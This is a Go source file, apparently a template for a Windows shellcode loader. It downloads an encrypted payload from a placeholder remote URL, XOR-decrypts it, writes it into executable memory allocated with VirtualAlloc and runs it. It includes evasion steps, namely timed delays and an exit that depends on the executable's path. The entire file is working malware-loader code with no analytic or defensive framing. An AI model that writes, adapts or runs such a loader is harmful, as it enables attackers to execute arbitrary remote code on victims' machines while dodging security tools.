package main
	
import(
	"golang.org/x/sys/windows"
    "time"
	"unsafe"
	"math/rand"
	"os"
	"github.com/valyala/fasthttp"
	"syscall"
)

func XorDecrypt(plaintext []byte, key []byte) []byte {
    ciphertext := make([]byte, len(plaintext))
    keyLength := len(key)
    for i, byte := range plaintext {
        keyByte := key[i % keyLength]
        encryptedByte := byte ^ keyByte
        ciphertext[i] = encryptedByte
    }
    return ciphertext
}

func DecryptData(v2 []byte) []byte {
	key := []byte{{{Key}}}
	v222 := XorDecrypt(v2, key)
	return v222
}

func WriteMemory(inbuf []byte, destination uintptr) {
	for index := uint32(0); index < uint32(len(inbuf)); index++ {
		writePtr := unsafe.Pointer(destination + uintptr(index))
		v := (*byte)(writePtr)
		*v = inbuf[index]
	}
}

func Ldr1(calc []byte) {

	mKernel32, _ := syscall.LoadDLL("kernel32.dll")
	fVirtualAlloc, _ := mKernel32.FindProc("VirtualAlloc")
	calc_len := uintptr(len(calc))
	Ptr1, _, _ := fVirtualAlloc.Call(uintptr(0), calc_len, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	WriteMemory(calc, Ptr1)
	syscall.SyscallN(Ptr1, 0, 0, 0, 0)
}

func Sleeeep()  {
	res := 1
	for i := 0; i < 5; i++ {
		number := rand.Intn(900) + 100
		res *= number
	}
	time.Sleep(10 * time.Second)
}


func fetchShellcode() []byte {

	url := "{{REMOTE_URL}}"

	_, body, _ := fasthttp.Get(nil, url)

	return body
}

func main() {

	args := os.Args[0]
	if (args[10] == 92 && (args[0] == 99 || args[0] == 67)) {
		os.Exit(0)
	}

    Sleeeep()

	ciphertext := fetchShellcode()
    Sleeeep()
	byteData := DecryptData(ciphertext)

	Ldr1(byteData)

}